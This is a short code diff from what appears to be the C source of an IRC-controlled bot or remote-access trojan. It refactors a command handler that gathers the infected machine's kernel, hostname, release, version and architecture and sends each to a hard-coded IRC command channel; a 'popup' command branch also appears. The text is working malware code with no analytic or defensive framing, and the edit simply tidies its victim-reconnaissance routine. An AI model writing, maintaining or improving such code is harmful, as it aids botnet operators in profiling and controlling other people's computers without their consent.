@@ -82,26 +82,27 @@ void et_main_loop_nix(int socket, char *nick)
 						struct utsname sys_info;
 						uname(&sys_info);
 
-						char sysname[512];
-						char nodename[512];
-						char release[512];
-						char version[512];
-						char machine[512];
+						char info[512];
 
-						snprintf(sysname, 512, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
-						send(socket, sysname, strlen(sysname), 0);
+						snprintf(info, 512, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
+						send(socket, info, strlen(info), 0);
+						memset(info, 0, 512);
 
-						snprintf(nodename, 512, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
-						send(socket, nodename, strlen(nodename), 0);
-						
-						snprintf(release, 512, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
-						send(socket, release, strlen(release), 0);
+						snprintf(info, 512, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
+						send(socket, info, strlen(info), 0);
+						memset(info, 0, 512);
 
-						snprintf(version, 512, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
-						send(socket, version, strlen(version), 0);
+						snprintf(info, 512, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
+						send(socket, info, strlen(info), 0);
+						memset(info, 0, 512);
 
-						snprintf(machine, 512, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
-						send(socket, machine, strlen(machine), 0);
+						snprintf(info, 512, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
+						send(socket, info, strlen(info), 0);
+						memset(info, 0, 512);
+
+						snprintf(info, 512, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
+						send(socket, info, strlen(info), 0);
+						memset(info, 0, 512);
 					}
 					else if (strstr(cmd, "popup"))
 					{
